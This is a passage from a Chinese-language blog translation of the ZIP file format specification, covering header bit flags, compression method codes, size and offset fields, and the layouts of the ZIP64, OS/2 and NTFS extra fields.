title="2.4.4、通用位标志(General purpose bit flag) (2 bytes)"></a>2.4.4、通用位标志(General purpose bit flag) (2 bytes)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Bit 0: 如果设置，表示文件已加密。</span><br><span class="line"></span><br><span class="line">(压缩方法6 - Imploding)</span><br><span class="line">Bit 1: 如果使用的压缩方法是类型6，Imploding。如果设置了此位，表明</span><br><span class="line">       使用了8K滑动词典。如果清除了此位，表明使用了4K滑动词典。</span><br><span class="line">Bit 2: 如果使用的压缩方法是类型6，Imploding。如果设置了此位，表明</span><br><span class="line">       使用了3个Shannon-Fano树来编码滑动字典输出。如果清除了此位，</span><br><span class="line">       则使用了2个Shannon-Fano树。</span><br><span class="line"></span><br><span class="line">(压缩方法8和9 - Deflating)</span><br><span class="line">Bit 2  Bit 1</span><br><span class="line">  0      0    使用了正常（-en）压缩选项。</span><br><span class="line">  0      1    使用了最大（-exx/-ex）压缩选项。</span><br><span class="line">  1      0    使用了快速（-ef）压缩选项。</span><br><span class="line">  1      1    使用了超快速（-es）压缩选项。</span><br><span class="line"></span><br><span class="line">(压缩方法14 - LZMA)</span><br><span class="line">Bit 1: 如果使用的压缩方法是类型14，LZMA。如果设置了此位，表明使用</span><br><span class="line">       end-of-stream(EOS)标记来标记压缩数据流的结束。如果清除了</span><br><span class="line">       此位，则不使用EOS标记，并且必须知道提取的压缩数据大小。</span><br><span class="line">注意: 如果压缩方法是任何其他方式，则位1和2是不确定的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Bit 3: 如果设置了此位，则本地头中的字段CRC-32，压缩大小和未压缩大小</span><br><span class="line">       设置为零。正确的值将紧随压缩数据之后放入数据描述符中。</span><br><span class="line">注意：用于DOS的PKZIP版本2.04g仅在压缩方法8中识别此位，对于任何压缩方法，较新版本的PKZIP均识别该位。</span><br><span class="line">Bit 4: 保留用于压缩方法8，以增强deflating。</span><br><span class="line">Bit 5: 如果设置此位，则表明文件是压缩的补丁数据。</span><br><span class="line">注意：需要PKZIP版本2.70或更高版本。</span><br><span class="line">Bit 6: 强加密功能。如果设置了此位，则必须将提取文件所需的版本设置为</span><br><span class="line">       至少50，并且还必须设置位0。如果使用AES加密，则提取文件所需</span><br><span class="line">       的版本必须至少为51。有关详细信息，请参见强加密规范。 </span><br><span class="line">Bit 7: 目前未使用。</span><br><span class="line">Bit 8: 目前未使用。</span><br><span class="line">Bit 9: 目前未使用。</span><br><span class="line">Bit 10: 目前未使用。</span><br><span class="line">Bit 11: 语言编码标志(EFS)。 如果该位置1，则该文件的文件名和注释字</span><br><span class="line">        段必须使用UTF-8编码。(请参阅附录D)</span><br><span class="line">Bit 12: 由PKWARE保留，用于增强压缩。</span><br><span class="line">Bit 13: 在加密中心目录时设置，以指示本地头中的选定数据值被屏蔽以隐藏</span><br><span class="line">        其实际值。有关详细信息，请参见描述强加密规范的部分。 </span><br><span class="line">Bit 14: 由PKWARE保留。</span><br><span class="line">Bit 15: 由PKWARE保留。</span><br></pre></td></tr></table></figure><h4 id="2-4-5、压缩方法-Compression-method-2-bytes"><a href="#2-4-5、压缩方法-Compression-method-2-bytes" class="headerlink" title="2.4.5、压缩方法(Compression method) (2 bytes)"></a>2.4.5、压缩方法(Compression method) (2 bytes)</h4><ul><li><code>0</code> - The file is stored (no compression)：存储(无压缩)。</li><li><code>1</code> - The file is Shrunk：文件缩小。</li><li><code>2</code> - The file is Reduced with compression factor 1：待补充。</li><li><code>3</code> - The file is Reduced with compression factor 2：待补充。</li><li><code>4</code> - The file is Reduced with compression factor 3：待补充。</li><li><code>5</code> - The file is Reduced with compression factor 4：待补充。</li><li><code>6</code> - The file is Imploded：Imploding压缩算法。</li><li><code>7</code> - Reserved for Tokenizing compression algorithm：为Tokenizing压缩算法保留。</li><li><code>8</code> - The file is Deflated：Deflated压缩算法。</li><li><code>9</code> - Enhanced Deflating using Deflate64(tm)：加强的压缩算法Deflate64(tm)。</li><li><code>10</code> - PKWARE Data Compression Library Imploding (old IBM TERSE)：PKWARE DCL Implode压缩算法(旧的IBM TERSE压缩算法)。</li><li><code>11</code> - Reserved by PKWARE：由PKWARE预留。</li><li><code>12</code> - File is compressed using BZIP2 algorithm：BZIP2压缩算法。</li><li><code>13</code> - Reserved by PKWARE：由PKWARE预留。</li><li><code>14</code> - LZMA：LZMA压缩算法。</li><li><code>15</code> - Reserved by PKWARE：由PKWARE预留。</li><li><code>16</code> - IBM z/OS CMPSC Compression：IBM z/OS CMPSC压缩算法。</li><li><code>17</code> - Reserved by PKWARE：由PKWARE预留。</li><li><code>18</code> - File is compressed using IBM TERSE (new)：IBM TERSE压缩算法(新的)。</li><li><code>19</code> - IBM LZ77 z Architecture (PFS)：IBM LZ77 z Architecture压缩算法。</li><li><code>96</code> - JPEG variant：JPEG变种压缩算法。</li><li><code>97</code> - WavPack compressed data：WavPack压缩算法。</li><li><code>98</code> - PPMd version I, Rev 1：PPMd压缩算法版本1。</li><li><code>99</code> - AE-x encryption marker (see APPENDIX E)：AE-x加密标记(请参阅附录E)。</li></ul><h4 id="2-4-6、日期和时间字段-Date-and-Time-fields-2-bytes"><a href="#2-4-6、日期和时间字段-Date-and-Time-fields-2-bytes" class="headerlink" title="2.4.6、日期和时间字段(Date and Time fields) (2 bytes)"></a>2.4.6、日期和时间字段(Date and Time fields) (2 bytes)</h4><p>&emsp;&emsp;日期和时间以<code>标准MS-DOS格式</code>编码。如果输入来自<code>标准输入</code>，则日期和时间是<code>开始对此数据进行压缩</code>的日期和时间。 如果<code>加密了中心目录</code>并且设置了<code>通用位标志13</code>以表示屏蔽，则存储在本地头中的值将为零。 <code>MS-DOS时间格式</code>不同于计算机常用的时间格式，例如<code>UTC</code>。 例如，MS-DOS使用相对于1980年和2秒精度的<code>年份值</code>。</p><h4 id="2-4-7、CRC-32-4-bytes"><a href="#2-4-7、CRC-32-4-bytes" class="headerlink" title="2.4.7、CRC-32 (4 bytes)"></a>2.4.7、CRC-32 (4 bytes)</h4><p>&emsp;&emsp;<code>CRC-32</code>算法由<code>David Schwaderer</code>慷慨贡献，可以在他的出色著作《 NetBIOS C程序员指南》中找到，该书由Howard W. Sams＆Co. Inc.发行。CRC的“<code>Magic Number</code>”为<code>0xDEBB20E3</code>。使用了适当的CRC<code>预处理</code>和<code>后处理</code>，这意味着所有CRC寄存器被预处理了(起始值为<code>0xFFFFFFFF</code>)，并且该值通过<code>对CRC残差进行补码</code>来进行后处理。如果设置了<code>通用位标志的第3位</code>，则该字段在本地头中设置为零，并将<code>正确的值</code>放在<code>数据描述符</code>和<code>中心目录</code>中。<code>加密中心目录</code>时，如果本地头不是<code>ZIP64格式</code>，并且设置了<code>通用位标志13</code>以表示屏蔽，则本地头中存储的值将为零。</p><h4 id="2-4-8、压缩文件的大小-Compressed-size-4-bytes"><a href="#2-4-8、压缩文件的大小-Compressed-size-4-bytes" class="headerlink" title="2.4.8、压缩文件的大小(Compressed size) (4 bytes)"></a>2.4.8、压缩文件的大小(Compressed size) (4 bytes)</h4><h4 id="2-4-9、未压缩文件的大小-Uncompressed-size-4-bytes"><a href="#2-4-9、未压缩文件的大小-Uncompressed-size-4-bytes" class="headerlink" title="2.4.9、未压缩文件的大小(Uncompressed size) (4 bytes)"></a>2.4.9、未压缩文件的大小(Uncompressed size) (4 bytes)</h4><p>&emsp;&emsp;<code>压缩文件的大小</code>(2.4.8)和<code>未压缩文件的大小</code>(2.4.9)。存在<code>解密头</code>时，它将被放置在<code>文件数据</code>的前面，并且<code>压缩文件大小的值</code>将包括<code>解密头的字节</code>。如果设置了<code>通用位标志的位3</code>，则这些字段在<code>本地头</code>中设置为<code>零</code>，并且<code>正确的值</code>放在<code>数据描述符</code>和<code>中心目录</code>中。如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFFFFFF</code>，则大小将在相应的8字节<code>ZIP64扩展信息扩展字段</code>中。当<code>加密中心目录</code>时，如果<code>本地头</code>不是ZIP64格式，并且设置了<code>通用位标志的位13</code>以表示屏蔽，则在<code>本地头</code>中为<code>未压缩文件大小</code>存储的值将为<code>零</code>。</p><h4 id="2-4-10、文件名长度-File-name-length-2-bytes"><a href="#2-4-10、文件名长度-File-name-length-2-bytes" class="headerlink" title="2.4.10、文件名长度(File name length) (2 bytes)"></a>2.4.10、文件名长度(File name length) (2 bytes)</h4><h4 id="2-4-11、扩展区域长度-Extra-field-length-2-bytes"><a href="#2-4-11、扩展区域长度-Extra-field-length-2-bytes" class="headerlink" title="2.4.11、扩展区域长度(Extra field length) (2 bytes)"></a>2.4.11、扩展区域长度(Extra field length) (2 bytes)</h4><h4 id="2-4-12、文件注释长度-File-comment-length-2-bytes"><a href="#2-4-12、文件注释长度-File-comment-length-2-bytes" class="headerlink" title="2.4.12、文件注释长度(File comment length) (2 bytes)"></a>2.4.12、文件注释长度(File comment length) (2 bytes)</h4><p>&emsp;&emsp;<code>文件名</code>，<code>扩展区域字段</code>和<code>文件注释字段</code>的长度。<code>任何目录记录</code>和<code>这三个字段</code>的<code>合计长度</code>通常不应超过<code>65535</code>个字节。如果输入来自<code>标准输入</code>，则<code>文件名长度</code>设置为零。</p><h4 id="2-4-13、文件开始位置所在的磁盘编号-Disk-number-start-2-bytes"><a href="#2-4-13、文件开始位置所在的磁盘编号-Disk-number-start-2-bytes" class="headerlink" title="2.4.13、文件开始位置所在的磁盘编号(Disk number start) (2 bytes)"></a>2.4.13、文件开始位置所在的磁盘编号(Disk number start) (2 bytes)</h4><p>&emsp;&emsp;该文件开始所在的磁盘编号。如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFF</code>，则此字段将在相应的4字节<code>ZIP64扩展信息扩展字段</code>中。</p><h4 id="2-4-14、内部文件属性-Internal-file-attributes-2-bytes"><a href="#2-4-14、内部文件属性-Internal-file-attributes-2-bytes" class="headerlink" title="2.4.14、内部文件属性(Internal file attributes) (2 bytes)"></a>2.4.14、内部文件属性(Internal file attributes) (2 bytes)</h4><p>&emsp;&emsp;<code>位1</code>和<code>位2</code>保留供PKWARE使用。<br>&emsp;&emsp;如果<code>设置</code>该字段的<code>最低位</code>，则表明该文件显然是<code>ASCII</code>或<code>文本</code>文件。 如果<code>未设置</code>，则该文件显然包含<code>二进制数据</code>。其余位在<code>1.0版</code>中未使用。<br>&emsp;&emsp;如果设置了此字段的<code>0x0002位</code>，则表示每个<code>逻辑记录</code>之前都有4字节可变<code>记录长度控制字段</code>，指示<code>记录的长度</code>。 记录长度控制字段以<code>小端字节序</code>存储。 该标志独立于<code>文本控制字符</code>，并且如果与<code>文本数据</code>一起使用，则在<code>记录的总长度</code>中包括<code>所有控制字符</code>。 提供此值是为了支持<code>大型数据传输</code>。</p><h4 id="2-4-15、外部文件属性-External-file-attributes-4-bytes"><a href="#2-4-15、外部文件属性-External-file-attributes-4-bytes" class="headerlink" title="2.4.15、外部文件属性(External file attributes) (4 bytes)"></a>2.4.15、外部文件属性(External file attributes) (4 bytes)</h4><p>&emsp;&emsp;<code>外部属性的映射</code>取决于<code>主机系统</code>(请参阅“Version made by”)。对于<code>MS-DOS</code>，<code>低位字节</code>是MS-DOS<code>目录属性字节</code>。如果输入来自<code>标准输入</code>，则此字段设置为<code>0</code>。</p><h4 id="2-4-16、本地文件头的相对偏移-Relative-offset-of-local-header-4-bytes"><a href="#2-4-16、本地文件头的相对偏移-Relative-offset-of-local-header-4-bytes" class="headerlink" title="2.4.16、本地文件头的相对偏移(Relative offset of local header) (4 bytes)"></a>2.4.16、本地文件头的相对偏移(Relative offset of local header) (4 bytes)</h4><p>&emsp;&emsp;这是从<code>此文件出现的第一个磁盘的开始</code>到<code>本地头</code>的偏移量。 如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFFFFFF</code>，则此字段将在相应的8字节<code>ZIP64扩展信息扩展字段</code>中。</p><h4 id="2-4-17、文件名-File-name-N-bytes"><a href="#2-4-17、文件名-File-name-N-bytes" class="headerlink" title="2.4.17、文件名(File name) (N bytes)"></a>2.4.17、文件名(File name) (N bytes)</h4><p>&emsp;&emsp;文件名，带有可选的<code>相对路径</code>。存储的路径不得包含<code>驱动器</code>或<code>设备字母</code>或<code>前导斜杠</code>。为了与<code>Amiga</code>和<code>UNIX</code>文件系统兼容，所有斜杠必须为<code>正斜杠“/”</code>，而不是<code>反斜杠“\”</code>。如果输入来自<code>标准输入</code>，则<code>没有</code>文件名字段。<br>&emsp;&emsp;如果使用<code>中心目录加密功能</code>，并且设置了<code>通用位标志的位13</code>以表示屏蔽，则存储在<code>本地头</code>中的文件名将<code>不是实际的文件名</code>。将存储由唯一的十六进制值组成的<code>掩码值</code>。对于压缩文件中的每个文件，此值将<code>按顺序递增</code>。有关检索加密文件名的详细信息，请参见“强加密规范”部分。 </p><h4 id="2-4-18、文件注释-File-comment-N-bytes"><a href="#2-4-18、文件注释-File-comment-N-bytes" class="headerlink" title="2.4.18、文件注释(File comment) (N bytes)"></a>2.4.18、文件注释(File comment) (N bytes)</h4><p>&emsp;&emsp;此压缩文件的<code>注释</code>。</p><h4 id="2-4-19、当前磁盘号-Number-of-this-disk-2-bytes"><a href="#2-4-19、当前磁盘号-Number-of-this-disk-2-bytes" class="headerlink" title="2.4.19、当前磁盘号(Number of this disk) (2 bytes)"></a>2.4.19、当前磁盘号(Number of this disk) (2 bytes)</h4><p>&emsp;&emsp;当前磁盘的编号，其中包含<code>中心目录结束记录</code>。 如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFF</code>，则此字段将在相应的<code>4字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-20、中心目录开头所在的磁盘号-Number-of-the-disk-with-the-start-of-the-central-directory-2-bytes"><a href="#2-4-20、中心目录开头所在的磁盘号-Number-of-the-disk-with-the-start-of-the-central-directory-2-bytes" class="headerlink" title="2.4.20、中心目录开头所在的磁盘号(Number of the disk with the start of the central directory) (2 bytes)"></a>2.4.20、中心目录开头所在的磁盘号(Number of the disk with the start of the central directory) (2 bytes)</h4><p>&emsp;&emsp;中心目录开头所在的磁盘号。 如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFF</code>，则此字段将在相应的<code>4字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-21、该磁盘上中心目录的条目总数-Total-number-of-entries-in-the-central-directory-on-this-disk-2-bytes"><a href="#2-4-21、该磁盘上中心目录的条目总数-Total-number-of-entries-in-the-central-directory-on-this-disk-2-bytes" class="headerlink" title="2.4.21、该磁盘上中心目录的条目总数(Total number of entries in the central directory on this disk) (2 bytes)"></a>2.4.21、该磁盘上中心目录的条目总数(Total number of entries in the central directory on this disk) (2 bytes)</h4><p>&emsp;&emsp;该磁盘上中心目录的条目总数。如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFF</code>，则此字段将在相应的<code>8字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-22、中心目录的条目总数-Total-number-of-entries-in-the-central-directory-2-bytes"><a href="#2-4-22、中心目录的条目总数-Total-number-of-entries-in-the-central-directory-2-bytes" class="headerlink" title="2.4.22、中心目录的条目总数(Total number of entries in the central directory) (2 bytes)"></a>2.4.22、中心目录的条目总数(Total number of entries in the central directory) (2 bytes)</h4><p>&emsp;&emsp;ZIP文件中的文件总数。如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFF</code>，则此字段将在相应的<code>8字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-23、中心目录的大小-Size-of-the-central-directory-4-bytes"><a href="#2-4-23、中心目录的大小-Size-of-the-central-directory-4-bytes" class="headerlink" title="2.4.23、中心目录的大小(Size of the central directory) (4 bytes)"></a>2.4.23、中心目录的大小(Size of the central directory) (4 bytes)</h4><p>&emsp;&emsp;整个中央目录的大小(以<code>字节</code>为单位)。 如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFFFFFF</code>，则此字段将在相应的<code>8字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-24、中心目录开始位置相对于压缩文档开始位置的偏移-Offset-of-start-of-central-directory-with-respect-to-the-starting-disk-number-4-bytes"><a href="#2-4-24、中心目录开始位置相对于压缩文档开始位置的偏移-Offset-of-start-of-central-directory-with-respect-to-the-starting-disk-number-4-bytes" class="headerlink" title="2.4.24、中心目录开始位置相对于压缩文档开始位置的偏移(Offset of start of central directory with respect to the starting disk number) (4 bytes)"></a>2.4.24、中心目录开始位置相对于压缩文档开始位置的偏移(Offset of start of central directory with respect to the starting disk number) (4 bytes)</h4><p>&emsp;&emsp;<code>中心目录开始位置</code>相对于<code>压缩文档开始位置</code>的偏移。如果压缩文件为<code>ZIP64格式</code>，并且此字段中的值为<code>0xFFFFFFFF</code>，则此字段将在相应的<code>8字节</code>的<code>ZIP64中心目录结束记录</code>中。</p><h4 id="2-4-25、-ZIP文件注释长度-ZIP-file-comment-length-2-bytes"><a href="#2-4-25、-ZIP文件注释长度-ZIP-file-comment-length-2-bytes" class="headerlink" title="2.4.25、.ZIP文件注释长度(.ZIP file comment length) (2 bytes)"></a>2.4.25、.ZIP文件注释长度(.ZIP file comment length) (2 bytes)</h4><p>&emsp;&emsp;此.ZIP文件的注释长度。</p><h4 id="2-4-26、-ZIP文件注释-ZIP-file-comment-N-bytes"><a href="#2-4-26、-ZIP文件注释-ZIP-file-comment-N-bytes" class="headerlink" title="2.4.26、.ZIP文件注释(.ZIP file comment) (N bytes)"></a>2.4.26、.ZIP文件注释(.ZIP file comment) (N bytes)</h4><p>&emsp;&emsp;此.ZIP文件的注释。ZIP文件注释数据<code>不安全</code>地存储。目前没有<code>加密</code>或<code>数据认证</code>应用于此区域。机密信息不应存储在本节中。</p><h4 id="2-4-27、ZIP64扩展数据段-ZIP64-extensible-data-sector-N-bytes"><a href="#2-4-27、ZIP64扩展数据段-ZIP64-extensible-data-sector-N-bytes" class="headerlink" title="2.4.27、ZIP64扩展数据段(ZIP64 extensible data sector) (N bytes)"></a>2.4.27、ZIP64扩展数据段(ZIP64 extensible data sector) (N bytes)</h4><p>&emsp;&emsp;目前保留供PKWARE使用。</p><h4 id="2-4-28、扩展区域-Extra-field-N-bytes"><a href="#2-4-28、扩展区域-Extra-field-N-bytes" class="headerlink" title="2.4.28、扩展区域(Extra field) (N bytes)"></a>2.4.28、扩展区域(Extra field) (N bytes)</h4><p>&emsp;&emsp;在<code>中心目录头</code>(Central directory header)中。<br>&emsp;&emsp;这应该被用于<code>存储扩展</code>。如果出于特殊<code>应用</code>或<code>平台</code>的需要，需要在ZIP文件中存储其他信息，则应将其存储在此处。然后，支持该规范较早版本的程序可以安全地跳过这个文件，并找到下一个文件或头。在<code>1.0版</code>中，该字段的长度为0。<br>&emsp;&emsp;<code>现有的扩展字段</code>在随后的“<code>可扩展数据字段</code>(Extensible data fields)”部分中定义。</p><h3 id="2-5、可扩展的数据字段-Extensible-data-fields"><a href="#2-5、可扩展的数据字段-Extensible-data-fields" class="headerlink" title="2.5、可扩展的数据字段(Extensible data fields)"></a>2.5、可扩展的数据字段(Extensible data fields)</h3><p>&emsp;&emsp;为了允许将<code>不同的程序</code>和<code>不同类型的信息</code>存储在.ZIP文件的<code>“扩展”字段</code>中，对于在此字段中存储数据的所有程序，必须使用<code>以下结构</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header1 + data1 + header2 + data2 . . .</span><br></pre></td></tr></table></figure></p><p>每个头必须包括：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">长度(byte)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header ID</td><td style="text-align:center">2</td><td style="text-align:left">头ID字段指示随后的数据块中数据的数据类型。</td></tr><tr><td style="text-align:left">Data Size</td><td style="text-align:center">2</td><td style="text-align:left">数据大小标识此数据块类型后面的数据的字节数。</td></tr></tbody></table><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><p>头ID字段指示随后的数据块中数据的数据类型。<br>头ID的0到31保留供PKWARE使用。其余的ID可以由第三方供应商用于专有用途。</p><p>PKWARE定义的当前<strong><code>头ID的映射</code></strong>为：</p><ul><li><code>0x0001</code> - Zip64 extended information extra field：ZIP64扩展信息扩展字段。</li><li><code>0x0007</code> - AV Info：AV信息。</li><li><code>0x0008</code> - Reserved for extended language encoding data (PFS)(see APPENDIX D)：保留用于扩展语言编码数据(PFS)（请参阅附录D）</li><li><code>0x0009</code> - OS/2</li><li><code>0x000A</code> - NTFS </li><li><code>0x000C</code> - OpenVMS</li><li><code>0x000D</code> - UNIX</li><li><code>0x000E</code> - Reserved for file stream and fork descriptors：保留用于文件流和派生描述符。</li><li><code>0x000F</code> - Patch Descriptor：补丁描述符。</li><li><code>0x0014</code> - PKCS#7 Store for X.509 Certificates：X.509证书的PKCS#7存储。</li><li><code>0x0015</code> - X.509 Certificate ID and Signature for individual file：X.509证书ID和单个文件的签名。</li><li><code>0x0016</code> - X.509 Certificate ID for Central Directory：中心目录的X.509证书ID。</li><li><code>0x0017</code> - Strong Encryption Header：强加密头。</li><li><code>0x0018</code> - Record Management Controls：记录管理控制。</li><li><code>0x0019</code> - PKCS#7 Encryption Recipient Certificate List：PKCS#7加密对象证书列表。</li><li><code>0x0020</code> - Reserved for Timestamp record：为Timestamp记录保留。</li><li><code>0x0021</code> - Policy Decryption Key Record：策略解密密钥记录。</li><li><code>0x0022</code> - Smartcrypt Key Provider Record：Smartcrypt密钥提供者记录。</li><li><code>0x0023</code> - Smartcrypt Policy Key Data Record：Smartcrypt策略密钥数据记录。</li><li><code>0x0065</code> - IBM S/390 (Z390), AS/400 (I400) attributes - uncompressed：IBM S/390 (Z390), AS/400 (I400)属性 - 未压缩。</li><li><code>0x0066</code> - Reserved for IBM S/390 (Z390), AS/400 (I400) attributes - compressed：为IBM S/390 (Z390), AS/400 (I400)属性保留 - 压缩。</li><li><code>0x4690</code> - POSZIP 4690 (reserved)：POSZIP 4690(保留)。</li></ul><h4 id="2-5-1、-ZIP64扩展信息扩展字段-ZIP64-Extended-Information-Extra-Field-0x0001"><a href="#2-5-1、-ZIP64扩展信息扩展字段-ZIP64-Extended-Information-Extra-Field-0x0001" class="headerlink" title="2.5.1、-ZIP64扩展信息扩展字段(ZIP64 Extended Information Extra Field)(0x0001)"></a>2.5.1、-ZIP64扩展信息扩展字段(ZIP64 Extended Information Extra Field)(0x0001)</h4><p>&emsp;&emsp;以下是<code>ZIP64扩展信息扩展块</code>的布局。如果<code>本地</code>或<code>中心目录记录</code>中的<code>大小</code>或<code>偏移量</code>字段之一太小而无法容纳所需的数据，则将创建一个<code>ZIP64扩展信息记录</code>。ZIP64扩展信息记录中<code>字段的顺序</code>是固定的，但是该字段必须仅在相应的<code>本地</code>或<code>中心目录记录</code>字段设置为<code>0xFFFF</code>或<code>0xFFFFFFFF</code>时显示。</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0001</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">Size</td><td style="text-align:center">2</td><td style="text-align:left">“扩展”块的大小</td></tr><tr><td style="text-align:left">Original Size</td><td style="text-align:center">8</td><td style="text-align:left">原始未压缩文件大小</td></tr><tr><td style="text-align:left">Compressed Size</td><td style="text-align:center">8</td><td style="text-align:left">压缩数据的大小</td></tr><tr><td style="text-align:left">Relative Header Offset</td><td style="text-align:center">8</td><td style="text-align:left">本地头记录的偏移量</td></tr><tr><td style="text-align:left">Disk Start Number</td><td style="text-align:center">4</td><td style="text-align:left">该文件开始所在的磁盘号</td></tr></tbody></table><p>&emsp;&emsp;<code>本地头</code>中的此项必须包含<code>原始</code>和<code>压缩</code>文件大小字段。如果对<code>中心目录</code>进行加密并且设置了<code>通用位标志的第13位</code>以指示屏蔽，则存储在本地头中的<code>原始文件大小</code>的值将为<code>0</code>。</p><h4 id="2-5-2、-OS-2扩展字段-OS-2-Extra-Field-0x0009"><a href="#2-5-2、-OS-2扩展字段-OS-2-Extra-Field-0x0009" class="headerlink" title="2.5.2、-OS/2扩展字段(-OS/2 Extra Field)(0x0009)"></a>2.5.2、-OS/2扩展字段(-OS/2 Extra Field)(0x0009)</h4><p>以下是<code>OS/2属性“扩展”块</code>的布局。( 最新修订日期为09/05/95)</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0009</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">以下数据块的大小</td></tr><tr><td style="text-align:left">BSize</td><td style="text-align:center">4</td><td style="text-align:left">未压缩的块大小</td></tr><tr><td style="text-align:left">CType</td><td style="text-align:center">2</td><td style="text-align:left">压缩类型</td></tr><tr><td style="text-align:left">EACRC</td><td style="text-align:center">4</td><td style="text-align:left">解压缩块的CRC值</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">N</td><td style="text-align:left">压缩块</td></tr></tbody></table><p>&emsp;&emsp;压缩<code>OS/2扩展属性结构</code>(FEA2LIST)，然后将其<code>完整存储</code>在此结构中。 <code>VarFields[]</code>中将永远只有一个“块”数据。</p><h4 id="2-5-3、-NTFS扩展字段-NTFS-Extra-Field-0x000A"><a href="#2-5-3、-NTFS扩展字段-NTFS-Extra-Field-0x000A" class="headerlink" title="2.5.3、-NTFS扩展字段(-NTFS Extra Field)(0x000A)"></a>2.5.3、-NTFS扩展字段(-NTFS Extra Field)(0x000A)</h4><p>&emsp;&emsp;以下是<code>NTFS属性“扩展”块</code>的布局。( <strong><code>注意：</code></strong>目前，<code>Mtime</code>，<code>Atime</code>和<code>Ctime</code>值可以在任何WIN32系统上使用。)</p><p><strong><code>注意：</code></strong>所有字段以Intel<code>低字节/高字节</code>顺序(<code>小端字节序</code>)存储。</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x000A</td><td style="text-align:center">2</td><td style="text-align:left">此“扩展”块类型的标签</td></tr><tr><td style="text-align:left">TSize</td><td style="text-align:center">2</td><td style="text-align:left">总“扩展”块的大小</td></tr><tr><td style="text-align:left">Reserved</td><td style="text-align:center">4</td><td style="text-align:left">保留以备将来使用</td></tr><tr><td style="text-align:left">Tag1</td><td style="text-align:center">2</td><td style="text-align:left">NTFS属性＃1的标签</td></tr><tr><td style="text-align:left">Size1</td><td style="text-align:center">2</td><td style="text-align:left">属性＃1的大小，以字节为单位</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">Size1</td><td style="text-align:left">属性＃1数据</td></tr><tr><td style="text-align:left">…</td><td style="text-align:center">…</td><td style="text-align:left">…</td></tr><tr><td style="text-align:left">TagN</td><td style="text-align:center">2</td><td style="text-align:left">NTFS属性＃N的标签</td></tr><tr><td style="text-align:left">SizeN</td><td style="text-align:center">2</td><td style="text-align:left">属性＃N的大小，以字节为单位</td></tr><tr><td style="text-align:left">(var)</td><td style="text-align:center">SizeN</td><td style="text-align:left">属性＃N数据</td></tr></tbody></table><p>对于NTFS，<code>Tag1到TagN</code>的值如下：(当前仅为NTFS定义了一组属性)</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:center">Size(byte)</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">0x0001</td><td style="text-align:center">2</td><td style="text-align:left">属性＃1的标签</td></tr><tr><td style="text-align:left">Size1</td><td style="text-align:center">2</td><td style="text-align:left">属性＃1的大小，以字节为单位</td></tr><tr><td style="text-align:left">Mtime</td><td style="text-align:center">8</td><td style="text-align:left">文件最后修改时间</td></tr><tr><td style="text-align:left">Atime</td><td style="text-align:center">8</td><td style="text-align:left">文件最后访问时间</td></tr><tr><td style="text-align:left">Ctime</td><td style="text-align:center">8</td><td style="text-align:left">文件创建时间</td></tr></tbody></table><h4 id="2-5-4、-OpenVMS扩展字段-OpenVMS-Extra-Field-0x000C"><a href="#2-5-4、-OpenVMS扩展字段-OpenVMS-Extra-Field-0x000C" class="headerlink" title="2.5.4、-OpenVMS扩展字段(-OpenVMS Extra 